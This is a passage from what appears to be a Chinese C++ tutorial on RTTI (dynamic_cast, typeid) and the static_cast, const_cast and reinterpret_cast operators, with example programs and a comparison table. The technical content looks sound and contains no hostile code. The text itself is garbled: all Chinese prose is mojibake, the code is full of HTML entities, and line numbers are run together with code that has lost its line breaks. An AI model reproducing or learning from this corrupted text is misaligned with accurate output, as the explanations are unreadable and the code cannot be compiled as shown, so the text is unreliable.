å¼•ç”¨è½¬æ¢: å¦‚æœ source_reference ç¡®å®å¼•ç”¨ä¸€ä¸ª TargetType ç±»å‹çš„å¯¹è±¡ï¼ˆæˆ–è€…æ˜¯ TargetType çš„æ´¾ç”Ÿç±»å¯¹è±¡ï¼‰ï¼Œåˆ™è½¬æ¢æˆåŠŸï¼Œè¿”å›å¯¹è¯¥å¯¹è±¡çš„ TargetType&amp; å¼•ç”¨ã€‚ å¦‚æœ source_reference å¼•ç”¨çš„å¯¹è±¡ä¸æ˜¯ TargetType ç±»å‹ï¼ˆæˆ–å…¶æ´¾ç”Ÿç±»ï¼‰ï¼Œåˆ™è½¬æ¢å¤±è´¥ï¼ŒæŠ›å‡º std::bad_cast å¼‚å¸¸ï¼ˆå®šä¹‰åœ¨ &lt;typeinfo&gt; ä¸­ï¼‰ã€‚ ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;iostream&gt;#include &lt;cstdlib&gt; // for rand(), srand()#include &lt;ctime&gt; // for time()#include &lt;typeinfo&gt; // for bad_cast#include &lt;stdexcept&gt; // for exceptionclass Grand &#123;private: int hold;public: Grand(int h = 0) : hold(h) &#123;&#125; virtual void Speak() const &#123; std::cout &lt;&lt; &quot;I am a grand class!\\n&quot;; &#125; virtual int Value() const &#123; return hold; &#125; virtual ~Grand() &#123;&#125; // è™šææ„å‡½æ•°&#125;;class Superb : public Grand &#123;public: Superb(int h = 0) : Grand(h) &#123;&#125; void Speak() const override &#123; std::cout &lt;&lt; &quot;I am a superb class!!\\n&quot;; &#125; virtual void Say() const &#123; std::cout &lt;&lt; &quot;I hold the superb value of &quot; &lt;&lt; Value() &lt;&lt; &quot;!\\n&quot;; &#125;&#125;;class Magnificent : public Superb &#123;private: char ch;public: Magnificent(int h = 0, char c = &#x27;A&#x27;) : Superb(h), ch(c) &#123;&#125; void Speak() const override &#123; std::cout &lt;&lt; &quot;I am a magnificent class!!!\\n&quot;; &#125; void Say() const override &#123; std::cout &lt;&lt; &quot;I hold the magnificent value of &quot; &lt;&lt; Value() &lt;&lt; &quot; and the character &quot; &lt;&lt; ch &lt;&lt; &quot;!\\n&quot;; &#125;&#125;;// å‡½æ•°ï¼šéšæœºç”Ÿæˆä¸€ä¸ªæŒ‡å‘ Grand, Superb æˆ– Magnificent å¯¹è±¡çš„æŒ‡é’ˆGrand * GetOne() &#123; Grand * p = nullptr; switch (std::rand() % 3) &#123; case 0: p = new Grand(std::rand() % 100); break; case 1: p = new Superb(std::rand() % 100); break; case 2: p = new Magnificent(std::rand() % 100, &#x27;A&#x27; + std::rand() % 26); break; &#125; return p;&#125;int main() &#123; std::srand(std::time(0)); Grand * pg; Superb * ps; Magnificent * pm; for (int i = 0; i &lt; 5; i++) &#123; pg = GetOne(); // è·å–ä¸€ä¸ªéšæœºç±»å‹çš„å¯¹è±¡æŒ‡é’ˆ std::cout &lt;&lt; &quot;Now processing type #&quot; &lt;&lt; i+1 &lt;&lt; std::endl; pg-&gt;Speak(); // è°ƒç”¨è™šå‡½æ•°ï¼Œæ€»æ˜¯æ­£ç¡®çš„ // å°è¯•å‘ä¸‹è½¬æ¢ä¸º Superb* ps = dynamic_cast&lt;Superb *&gt;(pg); if (ps != nullptr) &#123; // æ£€æŸ¥è½¬æ¢æ˜¯å¦æˆåŠŸ ps-&gt;Say(); // å¦‚æœæ˜¯ Superb æˆ– Magnificentï¼Œå¯ä»¥è°ƒç”¨ Say() &#125; else &#123; std::cout &lt;&lt; &quot; (Not a Superb or derived type)\\n&quot;; &#125; // å°è¯•å‘ä¸‹è½¬æ¢ä¸º Magnificent* pm = dynamic_cast&lt;Magnificent *&gt;(pg); if (pm != nullptr) &#123; // å¦‚æœæ˜¯ Magnificentï¼Œå¯ä»¥è°ƒç”¨ Say() (è¿™é‡Œä¼šè°ƒç”¨ Magnificent çš„ç‰ˆæœ¬) // pm-&gt;Say(); // å¯ä»¥è°ƒç”¨ï¼Œä½†ä¸Šé¢ Superb* çš„ Say() å·²ç»è°ƒç”¨è¿‡äº† std::cout &lt;&lt; &quot; (Also a Magnificent type)\\n&quot;; &#125; // å°è¯•ä½¿ç”¨å¼•ç”¨è½¬æ¢ (å¦‚æœå¤±è´¥ä¼šæŠ›å¼‚å¸¸) try &#123; Superb &amp; rs = dynamic_cast&lt;Superb &amp;&gt;(*pg); // å°è¯•è½¬æ¢ä¸º Superb å¼•ç”¨ std::cout &lt;&lt; &quot; Reference cast to Superb successful.\\n&quot;; // rs.Say(); // å¯ä»¥è°ƒç”¨ &#125; catch (const std::bad_cast &amp; bc) &#123; std::cout &lt;&lt; &quot; Reference cast to Superb failed: &quot; &lt;&lt; bc.what() &lt;&lt; std::endl; &#125; delete pg; // æ¸…ç†å†…å­˜ (éœ€è¦è™šææ„å‡½æ•°) std::cout &lt;&lt; &quot;--------------------\\n&quot;; &#125; return 0;&#125; 2. typeid() è¿ç®—ç¬¦typeid è¿ç®—ç¬¦è¿”å›ä¸€ä¸ª const std::type_info&amp; å¯¹è±¡ï¼Œè¡¨ç¤ºå…¶æ“ä½œæ•°çš„ç±»å‹ã€‚ è¯­æ³•: typeid(expression): è¿”å›è¡¨è¾¾å¼ expression çš„è¿è¡Œæ—¶ç±»å‹ä¿¡æ¯ï¼ˆå¦‚æœè¡¨è¾¾å¼æ˜¯è§£å¼•ç”¨çš„å¤šæ€æŒ‡é’ˆæˆ–å¼•ç”¨ï¼‰ã€‚å¦‚æœè¡¨è¾¾å¼ä¸æ˜¯å¤šæ€ç±»å‹ï¼Œåˆ™è¿”å›å…¶é™æ€ç±»å‹ä¿¡æ¯ã€‚ typeid(type-name): è¿”å›ç±»å‹ type-name çš„ç±»å‹ä¿¡æ¯ã€‚ std::type_info ç±»: name(): è¿”å›ä¸€ä¸ªå®ç°å®šä¹‰çš„ C é£æ ¼å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºç±»å‹çš„åç§°ã€‚åç§°çš„å…·ä½“æ ¼å¼ï¼ˆä¾‹å¦‚æ˜¯å¦åŒ…å«å‘½åç©ºé—´ã€æ˜¯å¦ç»è¿‡â€œä¿®é¥°â€/mangledï¼‰æ²¡æœ‰ç»Ÿä¸€æ ‡å‡†ã€‚ operator==: å¯ä»¥æ¯”è¾ƒä¸¤ä¸ª type_info å¯¹è±¡æ˜¯å¦ä»£è¡¨åŒä¸€ç±»å‹ã€‚ operator!=: å¯ä»¥æ¯”è¾ƒä¸¤ä¸ª type_info å¯¹è±¡æ˜¯å¦ä»£è¡¨ä¸åŒç±»å‹ã€‚ before(): ç”¨äºç¡®å®šä¸€ä¸ªç±»å‹åœ¨ç¼–è¯‘å™¨çš„å†…éƒ¨æ’åºé¡ºåºä¸­æ˜¯å¦ä½äºå¦ä¸€ä¸ªç±»å‹ä¹‹å‰ï¼ˆç”¨é€”è¾ƒå°‘ï¼‰ã€‚ æ³¨æ„: è¦ä½¿ç”¨ typeid å’Œ type_infoï¼Œéœ€è¦åŒ…å« &lt;typeinfo&gt; å¤´æ–‡ä»¶ã€‚ å¦‚æœ typeid çš„æ“ä½œæ•°æ˜¯ä¸€ä¸ª**ç©ºæŒ‡é’ˆ (nullptr)**ï¼Œå®ƒä¼šæŠ›å‡º std::bad_typeid å¼‚å¸¸ã€‚ å¦‚æœ typeid ç”¨äºéå¤šæ€ç±»å‹ï¼ˆæ²¡æœ‰è™šå‡½æ•°ï¼‰çš„æŒ‡é’ˆè§£å¼•ç”¨ï¼Œå®ƒè¿”å›çš„æ˜¯æŒ‡é’ˆçš„é™æ€ç±»å‹ä¿¡æ¯ï¼Œè€Œä¸æ˜¯å®é™…æŒ‡å‘å¯¹è±¡çš„ç±»å‹ä¿¡æ¯ã€‚ ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;typeinfo&gt; // for typeid, type_info#include &lt;cstdlib&gt;#include &lt;ctime&gt;// ä½¿ç”¨ä¸Šé¢å®šä¹‰çš„ Grand, Superb, Magnificent ç±»å’Œ GetOne() å‡½æ•°int main() &#123; std::srand(std::time(0)); Grand * pg = nullptr; for (int i = 0; i &lt; 5; i++) &#123; pg = GetOne(); std::cout &lt;&lt; &quot;Pointer pg type (static): &quot; &lt;&lt; typeid(pg).name() &lt;&lt; std::endl; // æŒ‡é’ˆæœ¬èº«çš„ç±»å‹ if (pg != nullptr) &#123; // å¯¹æŒ‡é’ˆè§£å¼•ç”¨ï¼Œè·å–è¿è¡Œæ—¶ç±»å‹ä¿¡æ¯ (å› ä¸º Grand æœ‰è™šå‡½æ•°) std::cout &lt;&lt; &quot;Object pointed to by pg (runtime): &quot; &lt;&lt; typeid(*pg).name() &lt;&lt; std::endl; // æ¯”è¾ƒç±»å‹ä¿¡æ¯ if (typeid(*pg) == typeid(Grand)) &#123; std::cout &lt;&lt; &quot; It&#x27;s exactly a Grand object.\\n&quot;; &#125; else if (typeid(*pg) == typeid(Superb)) &#123; std::cout &lt;&lt; &quot; It&#x27;s exactly a Superb object.\\n&quot;; &#125; else if (typeid(*pg) == typeid(Magnificent)) &#123; std::cout &lt;&lt; &quot; It&#x27;s exactly a Magnificent object.\\n&quot;; &#125; // æ£€æŸ¥æ˜¯å¦æ˜¯æŸç§ç±»å‹æˆ–å…¶æ´¾ç”Ÿç±» (é€šå¸¸ dynamic_cast æ›´é€‚åˆ) // æ³¨æ„ï¼štypeid æ¯”è¾ƒçš„æ˜¯ç²¾ç¡®ç±»å‹ï¼Œä¸ä¼šè€ƒè™‘ç»§æ‰¿å…³ç³» if (dynamic_cast&lt;Superb*&gt;(pg)) &#123; // æ£€æŸ¥æ˜¯å¦æ˜¯ Superb æˆ–å…¶æ´¾ç”Ÿç±» std::cout &lt;&lt; &quot; It&#x27;s a Superb or derived from Superb.\\n&quot;; &#125; delete pg; pg = nullptr; &#125; std::cout &lt;&lt; &quot;--------------------\\n&quot;; &#125; // å¯¹ç©ºæŒ‡é’ˆä½¿ç”¨ typeid ä¼šæŠ›å¼‚å¸¸ try &#123; std::cout &lt;&lt; &quot;Type of *nullptr: &quot; &lt;&lt; typeid(*pg).name() &lt;&lt; std::endl; &#125; catch (const std::bad_typeid&amp; bt) &#123; std::cerr &lt;&lt; &quot;Caught bad_typeid exception: &quot; &lt;&lt; bt.what() &lt;&lt; std::endl; &#125; return 0;&#125; dynamic_cast vs typeid: dynamic_cast ä¸»è¦ç”¨äºå®‰å…¨çš„ç±»å‹è½¬æ¢ï¼Œå¹¶æ£€æŸ¥å¯¹è±¡æ˜¯å¦å±äºæŸä¸ªç±»å‹æˆ–å…¶æ´¾ç”Ÿç±»ã€‚ typeid ä¸»è¦ç”¨äºè·å–å¯¹è±¡çš„ç²¾ç¡®ç±»å‹ä¿¡æ¯å¹¶è¿›è¡Œæ¯”è¾ƒã€‚å®ƒä¸ç›´æ¥ç”¨äºç±»å‹è½¬æ¢ã€‚ åœ¨éœ€è¦æ ¹æ®ç±»å‹æ‰§è¡Œä¸åŒæ“ä½œæ—¶ï¼Œå¦‚æœè¿™äº›æ“ä½œå¯ä»¥é€šè¿‡è™šå‡½æ•°å®ç°ï¼Œåˆ™ä¼˜å…ˆä½¿ç”¨è™šå‡½æ•°ã€‚å¦‚æœå¿…é¡»è¿›è¡Œå‘ä¸‹è½¬æ¢ï¼Œdynamic_cast é€šå¸¸æ˜¯æ¯” typeid ç»“åˆ static_cast æ›´å®‰å…¨çš„é€‰æ‹©ã€‚ RTTI å’Œç¼–è¯‘å™¨é€‰é¡¹: æŸäº›ç¼–è¯‘å™¨å¯èƒ½æä¾›ç¦ç”¨ RTTI çš„é€‰é¡¹ï¼Œä»¥å‡å°‘ä»£ç å¤§å°æˆ–è¿è¡Œæ—¶å¼€é”€ã€‚å¦‚æœç¦ç”¨äº† RTTIï¼Œdynamic_cast å’Œ typeid çš„è¡Œä¸ºå¯èƒ½ä¼šæ”¹å˜æˆ–å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚ 15.5 ç±»å‹è½¬æ¢è¿ç®—ç¬¦C++ ç»§æ‰¿äº† C è¯­è¨€çš„ç±»å‹è½¬æ¢è¯­æ³•ï¼ˆä¾‹å¦‚ (TypeName) expression æˆ– TypeName(expression)ï¼‰ã€‚ç„¶è€Œï¼Œè¿™ç§ C é£æ ¼çš„å¼ºåˆ¶ç±»å‹è½¬æ¢è¿‡äºç²—æ”¾ï¼Œéš¾ä»¥åœ¨ä»£ç ä¸­æŸ¥æ‰¾ï¼Œå¹¶ä¸”æ— æ³•åŒºåˆ†ä¸åŒç±»å‹çš„è½¬æ¢æ„å›¾ï¼ˆä¾‹å¦‚ï¼Œæ˜¯å»é™¤ const å±æ€§ï¼Œè¿˜æ˜¯åœ¨ç›¸å…³ç±»å‹é—´è½¬æ¢ï¼Œæˆ–æ˜¯å®Œå…¨é‡æ–°è§£é‡Šæ¯”ç‰¹ä½ï¼‰ã€‚ ä¸ºäº†æä¾›æ›´å®‰å…¨ã€æ›´æ˜ç¡®çš„ç±»å‹è½¬æ¢æ–¹å¼ï¼ŒC++ å¼•å…¥äº†å››ä¸ª**ç±»å‹è½¬æ¢è¿ç®—ç¬¦ (Type Cast Operators)**ï¼š static_cast&lt;&gt;() const_cast&lt;&gt;() reinterpret_cast&lt;&gt;() dynamic_cast&lt;&gt;() (å·²åœ¨ 15.4 RTTI ä¸­è¯¦ç»†ä»‹ç») è¿™äº›è¿ç®—ç¬¦å…·æœ‰ç»Ÿä¸€çš„è¯­æ³•æ ¼å¼ï¼šcast_name&lt;TargetType&gt;(expression)ã€‚å®ƒä»¬ä½¿è½¬æ¢æ„å›¾æ›´åŠ æ¸…æ™°ï¼Œå¹¶ä¸”å…è®¸ç¼–è¯‘å™¨è¿›è¡Œæ›´ä¸¥æ ¼çš„æ£€æŸ¥ã€‚ 1. static_cast&lt;TargetType&gt;(expression)static_cast ç”¨äºæ¯”è¾ƒâ€œè‡ªç„¶â€å’Œâ€œåˆç†â€çš„ç±»å‹è½¬æ¢ï¼Œä¸»è¦æ˜¯åœ¨ç›¸å…³ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ï¼Œæˆ–è€…æ‰§è¡Œç¼–è¯‘å™¨èƒ½å¤Ÿç†è§£çš„æ ‡å‡†è½¬æ¢ã€‚å®ƒåœ¨ç¼–è¯‘æ—¶è¿›è¡Œç±»å‹æ£€æŸ¥ã€‚ ä¸»è¦ç”¨é€”: ç›¸å…³ç±»å‹è½¬æ¢: åœ¨ç±»å±‚æ¬¡ç»“æ„ä¸­è¿›è¡Œå‘ä¸Šè½¬æ¢ï¼ˆæ´¾ç”Ÿç±»æŒ‡é’ˆ/å¼•ç”¨ -&gt; åŸºç±»æŒ‡é’ˆ/å¼•ç”¨ï¼‰ã€‚è¿™æ˜¯å®‰å…¨çš„ï¼Œè™½ç„¶é€šå¸¸éšå¼è½¬æ¢å³å¯ã€‚ åœ¨ç±»å±‚æ¬¡ç»“æ„ä¸­è¿›è¡Œå‘ä¸‹è½¬æ¢ï¼ˆåŸºç±»æŒ‡é’ˆ/å¼•ç”¨ -&gt; æ´¾ç”Ÿç±»æŒ‡é’ˆ/å¼•ç”¨ï¼‰ã€‚ä¸å®‰å…¨ï¼ static_cast ä¸è¿›è¡Œè¿è¡Œæ—¶ç±»å‹æ£€æŸ¥ã€‚å¦‚æœåŸºç±»æŒ‡é’ˆå®é™…æŒ‡å‘çš„ä¸æ˜¯ç›®æ ‡æ´¾ç”Ÿç±»å¯¹è±¡ï¼Œä½¿ç”¨è½¬æ¢åçš„æŒ‡é’ˆä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚åªæœ‰å½“ä½ ç¡®å®šæŒ‡é’ˆç¡®å®æŒ‡å‘ç›®æ ‡ç±»å‹æ—¶ï¼Œæ‰åº”ä½¿ç”¨ static_cast è¿›è¡Œå‘ä¸‹è½¬æ¢ï¼ˆdynamic_cast æ˜¯æ›´å®‰å…¨çš„é€‰æ‹©ï¼‰ã€‚ åŸºæœ¬æ•°æ®ç±»å‹è½¬æ¢: åœ¨æ•°å­—ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ï¼ˆå¦‚ int åˆ° float, double åˆ° intï¼‰ã€‚ æšä¸¾ä¸æ•´å‹è½¬æ¢: åœ¨æšä¸¾ç±»å‹å’Œæ•´å‹æˆ–æµ®ç‚¹ç±»å‹ä¹‹é—´è½¬æ¢ã€‚ void* è½¬æ¢: å°†ä»»ä½•ç±»å‹çš„æŒ‡é’ˆè½¬æ¢ä¸º void*ï¼Œæˆ–å°† void* è½¬æ¢å›åŸå§‹ç±»å‹çš„æŒ‡é’ˆï¼ˆæˆ–å…¼å®¹ç±»å‹çš„æŒ‡é’ˆï¼‰ã€‚ ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;class Base &#123; public: virtual ~Base() &#123;&#125; &#125;; // å¤šæ€åŸºç±»class Derived : public Base &#123;&#125;;int main() &#123; // åŸºæœ¬ç±»å‹è½¬æ¢ double pi = 3.14159; int integer_pi = static_cast&lt;int&gt;(pi); // double to int (æˆªæ–­) std::cout &lt;&lt; &quot;integer_pi: &quot; &lt;&lt; integer_pi &lt;&lt; std::endl; // è¾“å‡º 3 // å‘ä¸Šè½¬æ¢ (å®‰å…¨) Derived d; Base* pb = &amp;d; // éšå¼è½¬æ¢å³å¯ Base* pb_static = static_cast&lt;Base*&gt;(&amp;d); // æ˜¾å¼å‘ä¸Šè½¬æ¢ // å‘ä¸‹è½¬æ¢ (ä¸å®‰å…¨ï¼Œéœ€ç¨‹åºå‘˜ä¿è¯) Base* pb_maybe_d = new Derived(); // å‡è®¾æˆ‘ä»¬ç¡®å®š pb_maybe_d æŒ‡å‘ Derived Derived* pd_static = static_cast&lt;Derived*&gt;(pb_maybe_d); std::cout &lt;&lt; &quot;Static downcast successful (programmer assumed).\\n&quot;; delete pb_maybe_d; Base* pb_not_d = new Base(); // !! å±é™© !! pb_not_d å®é™…æŒ‡å‘ Baseï¼Œä½†æˆ‘ä»¬å¼ºåˆ¶è½¬ä¸º Derived* // Derived* pd_wrong = static_cast&lt;Derived*&gt;(pb_not_d); // pd_wrong-&gt;someDerivedMethod(); // *** æœªå®šä¹‰è¡Œä¸º *** delete pb_not_d; // void* è½¬æ¢ int i = 10; void* vp = static_cast&lt;void*&gt;(&amp;i); // int* to void* int* ip = static_cast&lt;int*&gt;(vp); // void* back to int* std::cout &lt;&lt; &quot;Value via void*: &quot; &lt;&lt; *ip &lt;&lt; std::endl; // è¾“å‡º 10 return 0;&#125; 2. const_cast&lt;TargetType&gt;(expression)const_cast æ˜¯å”¯ä¸€èƒ½å¤Ÿç§»é™¤ (cast away) æˆ–æ·»åŠ  const æˆ– volatile é™å®šç¬¦çš„ C++ è½¬æ¢è¿ç®—ç¬¦ã€‚ ä¸»è¦ç”¨é€”: ç§»é™¤ const: å½“ä½ æœ‰ä¸€ä¸ªæŒ‡å‘ const æ•°æ®çš„æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œä½†ä½ éœ€è¦è°ƒç”¨ä¸€ä¸ªä¸æ¥å— const å‚æ•°ï¼ˆä½†å®é™…ä¸Šä¸ä¼šä¿®æ”¹æ•°æ®ï¼‰çš„å‡½æ•°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ const_cast ä¸´æ—¶ç§»é™¤ const å±æ€§ã€‚ æ·»åŠ  const: è™½ç„¶ä¸å¸¸ç”¨ï¼Œä½†ä¹Ÿå¯ä»¥ç”¨æ¥æ·»åŠ  const å±æ€§ã€‚ é‡è¦è­¦å‘Š: const_cast åªèƒ½æ”¹å˜æŒ‡é’ˆæˆ–å¼•ç”¨çš„ const/volatile å±æ€§ï¼Œä¸èƒ½æ”¹å˜è¡¨è¾¾å¼çš„ç±»å‹ã€‚ä¾‹å¦‚ï¼Œä¸èƒ½ç”¨ const_cast å°† const char* è½¬æ¢ä¸º int*ã€‚ é€šè¿‡ const_cast ç§»é™¤ const å±æ€§åï¼Œå¦‚æœåŸå§‹å¯¹è±¡æœ¬èº«å°±æ˜¯ const çš„ï¼Œé‚£ä¹ˆè¯•å›¾é€šè¿‡è½¬æ¢åçš„æŒ‡é’ˆæˆ–å¼•ç”¨å»ä¿®æ”¹è¯¥å¯¹è±¡çš„å€¼ï¼Œå°†å¯¼è‡´**æœªå®šä¹‰è¡Œä¸º (Undefined Behavior)**ï¼const_cast ä¸»è¦ç”¨äºå¤„ç†æ¥å£ä¸åŒ¹é…çš„æƒ…å†µï¼Œè€Œä¸æ˜¯ç”¨æ¥ç ´åå¸¸é‡æ€§ã€‚ ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;// å‡è®¾æœ‰ä¸€ä¸ªæ—§çš„ C å‡½æ•°ï¼Œå®ƒæ¥å— char* ä½†ä¿è¯ä¸ä¿®æ”¹å†…å®¹void legacy_print(char* str) &#123; std::cout &lt;&lt; &quot;Legacy print: &quot; &lt;&lt; str &lt;&lt; std::endl;&#125;int main() &#123; const char* const_message = &quot;Hello&quot;; // è°ƒç”¨ legacy_print éœ€è¦ char*ï¼Œä½†æˆ‘ä»¬åªæœ‰ const char* // æˆ‘ä»¬çŸ¥é“ legacy_print ä¸ä¼šä¿®æ”¹ï¼Œæ‰€ä»¥ä½¿ç”¨ const_cast char* non_const_message = const_cast&lt;char*&gt;(const_message); legacy_print(non_const_message); // OK const int constant_value = 100; const int* p_const = &amp;constant_value; // å°è¯•ç§»é™¤ const å¹¶ä¿®æ”¹ int* p_non_const = const_cast&lt;int*&gt;(p_const); // *p_non_const = 200; // *** æœªå®šä¹‰è¡Œä¸ºï¼*** å› ä¸º constant_value æœ¬èº«æ˜¯ const int variable_value = 50; const int* p_const_var = &amp;variable_value; int* p_non_const_var = const_cast&lt;int*&gt;(p_const_var); *p_non_const_var = 60; // OKï¼Œå› ä¸º variable_value æœ¬èº«ä¸æ˜¯ const std::cout &lt;&lt; &quot;variable_value: &quot; &lt;&lt; variable_value &lt;&lt; std::endl; // è¾“å‡º 60 return 0;&#125; 3. reinterpret_cast&lt;TargetType&gt;(expression)reinterpret_cast ç”¨äºæ‰§è¡Œä½çº§åˆ«çš„ã€å¯èƒ½ä¸å®‰å…¨çš„ç±»å‹è½¬æ¢ã€‚å®ƒæœ¬è´¨ä¸Šåªæ˜¯è¦æ±‚ç¼–è¯‘å™¨é‡æ–°è§£é‡Šè¡¨è¾¾å¼çš„**æ¯”ç‰¹æ¨¡å¼ (bit pattern)**ï¼Œå°†å…¶è§†ä¸º TargetType ç±»å‹ã€‚å®ƒå¾ˆå°‘è¿›è¡Œå®é™…çš„è½¬æ¢ï¼Œæ›´å¤šçš„æ˜¯ä¸€ç§ç¼–è¯‘æ—¶çš„æŒ‡ä»¤ã€‚ ä¸»è¦ç”¨é€”: æŒ‡é’ˆä¸æ•´å‹è½¬æ¢: åœ¨æŒ‡é’ˆç±»å‹å’Œè¶³å¤Ÿå¤§çš„æ•´å‹ï¼ˆå¦‚ uintptr_tï¼‰ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚ ä¸ç›¸å…³æŒ‡é’ˆç±»å‹è½¬æ¢: åœ¨ä¸ç›¸å…³çš„æŒ‡é’ˆç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ï¼ˆä¾‹å¦‚ï¼Œint* åˆ° char*ï¼‰ã€‚è¿™æ˜¯éå¸¸å±é™©çš„æ“ä½œï¼Œé€šå¸¸åªåœ¨éœ€è¦å¯¹åŸå§‹å†…å­˜è¿›è¡Œåº•å±‚æ“ä½œæ—¶ä½¿ç”¨ã€‚ å‡½æ•°æŒ‡é’ˆè½¬æ¢: åœ¨ä¸åŒçš„å‡½æ•°æŒ‡é’ˆç±»å‹ä¹‹é—´è½¬æ¢ï¼ˆåŒæ ·éå¸¸å±é™©ï¼‰ã€‚ é‡è¦è­¦å‘Š: reinterpret_cast çš„è¡Œä¸ºæ˜¯é«˜åº¦ä¾èµ–äºå…·ä½“å®ç°å’Œå¹³å°çš„ã€‚ ä½¿ç”¨ reinterpret_cast è¿›è¡Œçš„è½¬æ¢å‡ ä¹æ€»æ˜¯ä¸å¯ç§»æ¤çš„ã€‚ æ»¥ç”¨ reinterpret_cast ææ˜“å¯¼è‡´æœªå®šä¹‰è¡Œä¸ºå’Œéš¾ä»¥è°ƒè¯•çš„é”™è¯¯ã€‚ å®ƒåº”è¯¥åªåœ¨ç»å¯¹å¿…è¦ä¸”å®Œå…¨ç†è§£å…¶åæœçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œé€šå¸¸ç”¨äºä¸åº•å±‚ç¡¬ä»¶æˆ–æ—§çš„ C ä»£ç äº¤äº’ã€‚ ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;cstdint&gt; // for uintptr_tstruct Data &#123; int a; double b;&#125;;int main() &#123; int i = 65; // ASCII &#x27;A&#x27; // æŒ‡é’ˆç±»å‹è½¬æ¢ (å±é™©) int* pi = &amp;i; // å°† int* é‡æ–°è§£é‡Šä¸º char* char* pc = reinterpret_cast&lt;char*&gt;(pi); // ç»“æœå–å†³äºç³»ç»Ÿå­—èŠ‚åº (endianness) std::cout &lt;&lt; &quot;Reinterpreted char: &quot; &lt;&lt; *pc &lt;&lt; std::endl; // å¯èƒ½è¾“å‡º &#x27;A&#x27; æˆ–å…¶ä»– // æŒ‡é’ˆä¸æ•´æ•°è½¬æ¢ uintptr_t addr_val = reinterpret_cast&lt;uintptr_t&gt;(pi); // æŒ‡é’ˆè½¬æ•´æ•° std::cout &lt;&lt; &quot;Address as integer: &quot; &lt;&lt; std::hex &lt;&lt; addr_val &lt;&lt; std::endl; int* pi_back = reinterpret_cast&lt;int*&gt;(addr_val); // æ•´æ•°è½¬å›æŒ‡é’ˆ std::cout &lt;&lt; &quot;Value via int-&gt;ptr-&gt;int: &quot; &lt;&lt; std::dec &lt;&lt; *pi_back &lt;&lt; std::endl; // è¾“å‡º 65 // ä¸ç›¸å…³æŒ‡é’ˆç±»å‹è½¬æ¢ (éå¸¸å±é™©) Data d = &#123;1, 3.14&#125;; Data* pd = &amp;d; // å°† Data* é‡æ–°è§£é‡Šä¸º int* int* p_int_from_data = reinterpret_cast&lt;int*&gt;(pd); // è®¿é—® *p_int_from_data é€šå¸¸ä¼šå¾—åˆ° d.a çš„å€¼ (å–å†³äºå†…å­˜å¸ƒå±€) std::cout &lt;&lt; &quot;Reinterpreted int from Data*: &quot; &lt;&lt; *p_int_from_data &lt;&lt; std::endl; // å¯èƒ½è¾“å‡º 1 return 0;&#125; 4. dynamic_cast&lt;TargetType&gt;(expression)dynamic_cast ç”¨äºåœ¨å…·æœ‰è™šå‡½æ•°çš„ç±»å±‚æ¬¡ç»“æ„ä¸­è¿›è¡Œå®‰å…¨çš„å‘ä¸‹è½¬æ¢ã€‚å®ƒåœ¨è¿è¡Œæ—¶æ£€æŸ¥è½¬æ¢çš„æœ‰æ•ˆæ€§ã€‚ æŒ‡é’ˆè½¬æ¢: å¦‚æœè½¬æ¢æ— æ•ˆï¼Œè¿”å› nullptrã€‚ å¼•ç”¨è½¬æ¢: å¦‚æœè½¬æ¢æ— æ•ˆï¼ŒæŠ›å‡º std::bad_cast å¼‚å¸¸ã€‚ (è¯¦ç»†å†…å®¹è¯·å‚è€ƒ 15.4 RTTI) æ€»ç»“æ¯”è¾ƒ è¿ç®—ç¬¦ ä¸»è¦ç”¨é€” å®‰å…¨æ€§ è¿è¡Œæ—¶æ£€æŸ¥ å¯¹ const/volatile å¤‡æ³¨ static_cast ç›¸å…³ç±»å‹è½¬æ¢ã€æ•°å€¼è½¬æ¢ã€void* è½¬æ¢ ç›¸å¯¹å®‰å…¨ å¦ ä¸èƒ½ç§»é™¤ å‘ä¸‹è½¬æ¢ä¸å®‰å…¨ const_cast ç§»é™¤æˆ–æ·»åŠ  const/volatile ä½ (æ˜“æœªå®šä¹‰è¡Œä¸º) å¦ å”¯ä¸€èƒ½æ“ä½œ ä¸èƒ½æ”¹å˜åŸºæœ¬ç±»å‹ï¼Œä¿®æ”¹ const å¯¹è±¡æ˜¯æœªå®šä¹‰è¡Œä¸º reinterpret_cast ä½çº§åˆ«ä½æ¨¡å¼é‡æ–°è§£é‡Šã€æŒ‡é’ˆæ•´æ•°äº’è½¬ã€ä¸ç›¸å…³æŒ‡é’ˆäº’è½¬ éå¸¸ä½ å¦ ä¸èƒ½ç§»é™¤ ä¾èµ–å®ç°ã€ä¸å¯ç§»æ¤ã€ææ˜“å‡ºé”™ dynamic_cast å®‰å…¨çš„å‘ä¸‹è½¬æ¢ï¼ˆå¤šæ€ç±»å‹ï¼‰ é«˜ æ˜¯ ä¸èƒ½ç§»é™¤ éœ€è¦è™šå‡½æ•°ï¼Œå¤±è´¥æ—¶è¿”å› nullptr æˆ–æŠ›å¼‚å¸¸ ä½¿ç”¨åŸåˆ™: ä¼˜å…ˆä½¿ç”¨éšå¼è½¬æ¢å’Œè™šå‡½æ•°ã€‚ å½“éœ€è¦æ˜¾å¼è½¬æ¢æ—¶ï¼Œé€‰æ‹©æ„å›¾æœ€æ˜ç¡®ã€é™åˆ¶æœ€ä¸¥æ ¼çš„è½¬æ¢è¿ç®—ç¬¦ã€‚ å°½é‡ä½¿ç”¨ static_cast è¿›è¡Œâ€œåˆç†â€çš„è½¬æ¢ã€‚ åªåœ¨éœ€è¦æ”¹å˜ const/volatile å±æ€§æ—¶ä½¿ç”¨ const_castï¼Œå¹¶ç¡®ä¿ä¸ä¿®æ”¹åŸå§‹ const å¯¹è±¡ã€‚ 